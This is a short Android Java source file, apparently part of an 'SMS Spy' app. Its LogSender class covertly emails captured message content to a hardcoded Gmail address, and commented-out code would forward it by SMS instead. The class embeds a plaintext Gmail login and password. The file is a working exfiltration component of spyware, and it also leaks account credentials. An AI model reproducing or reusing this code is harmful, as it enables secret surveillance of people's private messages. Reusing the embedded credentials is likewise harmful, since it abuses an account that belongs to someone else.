package com.AmygdalaSoftware;

import android.util.Log;

public class LogSender {
	
	private static LogSender instance;
	
	public static LogSender getInstance() {
		if(LogSender.instance == null) {
			LogSender.instance = new LogSender();
		}
		return LogSender.instance;
	}
	
	public void sendLog(String message) {
	    try {
	        //SmsManager sms = SmsManager.getDefault();
	        //PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,new Intent("SMS_SENT"), 0);
	        //sms.sendTextMessage(SEND_NUMBER, null, message, sentPI, null);
	    	GMailSender gmailSender = new GMailSender("ugol13@gmail.com", "Bre123guet!");
	    	gmailSender.sendMail("ugol13@gmail.com", "SMS Spy", message, "Amyglada", "aj@ajinian.com");
	        Log.d(LogSender.class.getName(), "Sending sms message to spy");
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}
}
